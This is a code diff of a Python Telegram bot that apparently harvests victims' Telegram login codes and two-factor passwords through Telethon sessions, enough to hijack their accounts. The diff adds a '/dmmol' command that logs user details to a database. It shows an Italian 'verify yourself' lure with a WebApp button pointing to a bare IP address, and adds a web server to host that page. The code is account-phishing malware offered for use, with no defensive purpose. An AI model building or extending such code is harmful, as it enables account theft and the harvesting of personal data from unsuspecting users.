@@ -4,7 +4,7 @@ import json
 import phonenumbers
 from phonenumbers import geocoder
 from aiogram import Bot, Dispatcher, types
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from aiogram.utils import executor
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -12,6 +12,9 @@ from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeEx
 from pymongo import MongoClient
 from dotenv import load_dotenv
 from datetime import datetime
+from aiohttp import web
+import aiohttp_jinja2
+import jinja2
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -44,6 +47,22 @@ start_col = db["start"]
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
+
+# Настройка WebApp сервера
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+TEMPLATES_DIR = os.path.join(BASE_DIR, 'webapp')
+STATIC_DIR = os.path.join(BASE_DIR, 'webapp')
+
+# Создаем aiohttp приложение
+app = web.Application()
+# Настраиваем раздачу статических файлов
+app.router.add_static('/webapp/', path=STATIC_DIR, name='static')
+
+# Роут для главной страницы WebApp
+async def webapp_handler(request):
+    return web.FileResponse(os.path.join(TEMPLATES_DIR, 'index.html'))
+
+app.router.add_get('/webapp', webapp_handler)
 
 user_states = {}
 user_clients = {}
@@ -95,6 +114,39 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
         msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
         return msg.message_id
 
+# НОВАЯ КОМАНДА ДЛЯ ТЕСТА WEBAPP
+@dp.message_handler(commands=['dmmol'])
+async def cmd_dmmol(message: types.Message):
+    user = message.from_user
+    
+    update_user_log(
+        user_id=user.id,
+        updates={
+            "username": user.username,
+            "first_name": user.first_name,
+            "last_name": user.last_name,
+            "language_code": user.language_code,
+            "is_bot": user.is_bot,
+            "chat_id": message.chat.id,
+            "last_start": datetime.now(),
+            "status": "dmmol_webapp_test"
+        }
+    )
+
+    # Создаем WebApp кнопку
+    webapp_kb = ReplyKeyboardMarkup(resize_keyboard=True)
+    # Используем IP твоего сервера
+    webapp_url = "http://104.248.55.220:3001/webapp"
+    webapp_btn = KeyboardButton("🥰 Apri WebApp", web_app=WebAppInfo(url=webapp_url))
+    webapp_kb.add(webapp_btn)
+
+    await message.answer(
+        "👋🇮🇹 CIAO! ❤️\n"
+        "TEST WebApp - Per verificarti, apri il WebApp cliccando il pulsante in basso. 🤖👇",
+        reply_markup=webapp_kb
+    )
+
+# СТАРАЯ КОМАНДА /start (оставляем без изменений)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     user = message.from_user
@@ -365,4 +417,14 @@ async def process_2fa(message: types.Message):
         cleanup(user_id)
 
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
+    # Запускаем и бота, и веб-сервер вместе!
+    from aiogram.utils.executor import start_webhook
+    start_webhook(
+        dispatcher=dp,
+        webhook_path='',
+        on_startup=None,
+        on_shutdown=None,
+        host='0.0.0.0',
+        port=3001,
+        app=app,
+    )
